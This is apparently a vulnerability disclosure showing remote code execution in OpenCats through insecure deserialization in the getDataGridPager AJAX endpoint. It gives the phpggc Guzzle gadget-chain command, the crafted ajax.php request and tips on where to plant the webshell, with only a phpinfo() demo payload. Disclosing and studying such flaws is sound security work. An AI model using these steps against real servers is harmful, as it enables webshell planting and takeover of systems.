# Remote Code Execution via insecure deserialization in OpenCats getDataGridPager's ajax functionality.

### Vulnerable code
![1](https://user-images.githubusercontent.com/57464251/192362357-97122d6f-b9ee-4662-9655-103d5faa0a90.png)

## How to achieve command execution
Useful information: OpenCats uses Guzzle, it can be used as a gadget chain.  
It is possible to craft serialized object using [phpggc](https://github.com/ambionics/phpggc) tool, that has Guzzle gadget chain predefined.  

1) Create payload that will be executed. I will use phpinfo().  
`echo "<?php phpinfo(); ?>" > /tmp/shell.php`  

2) Create serialized payload with phpggc that will upload malicous shell to provided directory on web server.  
`./phpggc -u --fast-destruct Guzzle/FW1 /var/www/html/opencats/pwned.php /tmp/shell.php`  

![2](https://user-images.githubusercontent.com/57464251/192364460-4d405c7c-9ecd-46a6-a6f5-ac532af40cff.png)


3) Copy the payload inside 'p' parameter.  
`/ajax.php?f=getDataGridPager&i=1&p=PAYLOAD_FROM_PREVIOUS_STEP`  

![3](https://user-images.githubusercontent.com/57464251/192364747-b37b9034-a301-4446-a1e7-73b2614c3fb5.png)

4) Execute webshell.

![4](https://user-images.githubusercontent.com/57464251/192365176-d9f537cd-51c5-4e87-bfab-e762f9724e7c.png)


Ending notes. Upload location might vary from system to system, depending if www-data has write permission to web server's root directory.
In case / (web server's root) is not writeable, upload a webshell to '/upload/pwned.php' instead.  
